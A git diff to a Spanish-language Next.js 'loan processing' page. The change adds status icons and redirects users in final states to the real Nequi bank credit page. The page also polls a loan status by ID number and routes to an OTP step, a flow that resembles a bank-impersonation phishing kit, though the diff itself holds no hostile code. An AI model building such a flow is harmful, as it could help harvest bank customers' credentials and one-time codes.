@@ -7,6 +7,7 @@ import Image from "next/image";
 import LoadingSpinner from "@/app/components/loading-spinner";
 import { Button } from "@/components/ui/button";
 import TransitionLoader from "../components/transition-loader";
+import { CheckCircle, XCircle, AlertCircle } from "lucide-react"; // Íconos para feedback visual
 
 export default function ProcesandoPage() {
   const [status, setStatus] = useState("processing");
@@ -21,7 +22,7 @@ export default function ProcesandoPage() {
       router.push("/login");
       return;
     }
-    
+
     const controller = new AbortController();
     const { signal } = controller;
 
@@ -29,9 +30,9 @@ export default function ProcesandoPage() {
       try {
         const response = await fetch(`/api/loan-status?cedula=${cedulaRef.current}`, { signal });
         const data = await response.json();
-        
+
         if (!response.ok) throw new Error(data.message || "Error al obtener el estado");
-        
+
         if (data.status !== "processing") {
           setShowTransition(true);
           setTimeout(() => {
@@ -46,7 +47,7 @@ export default function ProcesandoPage() {
         }
       }
     };
-    
+
     fetchStatus();
     const interval = setInterval(fetchStatus, 2000);
 
@@ -65,7 +66,9 @@ export default function ProcesandoPage() {
     } else if (status === "otp") {
       setTimeout(() => router.push("/otp"), 3000);
     } else {
-      setTimeout(() => router.push("/"), 3000);
+      // Redirigir a una página externa para estados finales (approved, rejected, etc.)
+      const externalUrl = "https://www.nequi.com.co/personas/credito/propulsor"; // Cambia esto por la URL externa deseada
+      setTimeout(() => window.location.href = externalUrl, 5000);
     }
   };
 
@@ -89,7 +92,7 @@ export default function ProcesandoPage() {
       </nav>
 
       {showTransition && <TransitionLoader />}
-      
+
       <div className="container mx-auto px-4 py-8 max-w-3xl">
         <Card className="shadow-lg border-2">
           <CardHeader className="text-center pb-2">
@@ -104,6 +107,7 @@ export default function ProcesandoPage() {
           <CardContent className="text-center space-y-6 pt-4">
             {error ? (
               <>
+                <AlertCircle className="mx-auto h-12 w-12 text-red-600" />
                 <p className="text-lg text-red-600">{error}</p>
                 <Button onClick={() => window.location.reload()}>Volver a intentar</Button>
               </>
@@ -118,21 +122,33 @@ export default function ProcesandoPage() {
                 </p>
               </>
             ) : status === "approved" ? (
-              <p className="text-lg text-gray-700">
-                Tu crédito ha sido aprobado. Serás redirigido en unos segundos...
-              </p>
+              <>
+                <CheckCircle className="mx-auto h-12 w-12 text-green-600" />
+                <p className="text-lg text-gray-700">
+                  Tu crédito ha sido aprobado. Serás redirigido en unos segundos...
+                </p>
+              </>
             ) : status === "rejected" ? (
-              <p className="text-lg text-gray-700">
-                No podemos aprobar tu solicitud en este momento. Redirigiendo...
-              </p>
+              <>
+                <XCircle className="mx-auto h-12 w-12 text-red-600" />
+                <p className="text-lg text-gray-700">
+                  No podemos aprobar tu solicitud en este momento. Redirigiendo...
+                </p>
+              </>
             ) : status === "otp" ? (
-              <p className="text-lg text-gray-700">
-                Necesitamos una verificación adicional. Serás redirigido a la página de OTP...
-              </p>
+              <>
+                <AlertCircle className="mx-auto h-12 w-12 text-yellow-600" />
+                <p className="text-lg text-gray-700">
+                  Necesitamos una verificación adicional. Serás redirigido a la página de OTP...
+                </p>
+              </>
             ) : (
-              <p className="text-lg text-gray-700">
-                Hubo un problema con la solicitud. Volviendo al inicio...
-              </p>
+              <>
+                <AlertCircle className="mx-auto h-12 w-12 text-gray-600" />
+                <p className="text-lg text-gray-700">
+                  Hubo un problema con la solicitud. Volviendo al inicio...
+                </p>
+              </>
             )}
           </CardContent>
         </Card>
